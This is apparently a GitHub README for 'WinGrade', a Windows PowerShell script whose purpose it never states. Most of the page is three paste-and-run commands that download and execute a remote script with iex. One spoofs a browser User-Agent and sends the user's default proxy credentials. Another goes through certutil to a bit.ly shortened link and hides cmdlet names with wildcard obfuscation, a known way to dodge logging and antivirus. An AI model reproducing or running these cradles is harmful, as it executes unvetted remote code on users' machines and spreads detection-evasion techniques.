# WinGrade

You can execute it in every Windows Operating System from Windows 7 - 10.

You don't have to Download the Program directly at github.

Just execute [CMD]:
```powershell
powershell "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/scripts/search.ps1')"
```
or
```powershell
powershell "$down=New-Object Net.WebClient;$down.Headers['User-Agent']='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19';$down.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$down.DownloadString('https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/scripts/search.ps1')|iex"
```
in [POWERSHELL]:

```powershell
powershell "iex(((C:\Windows\System32\certutil -ping https://bit.ly/2tZuas2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{`$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-Skip 2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{`$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-SkipLast 1)-Join'`r`n'))"
```

Tested on following Operating Systems:

|   System        |  x64  |  x86  |
| :---            | :---: | :---: |
| Windows 10      |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
| Windows 8.1     |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
| Windows 8       |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
| Windows 7       |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
| Windows Vista   |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |

This Script is still in the early Alpha release!!! And has some bugs
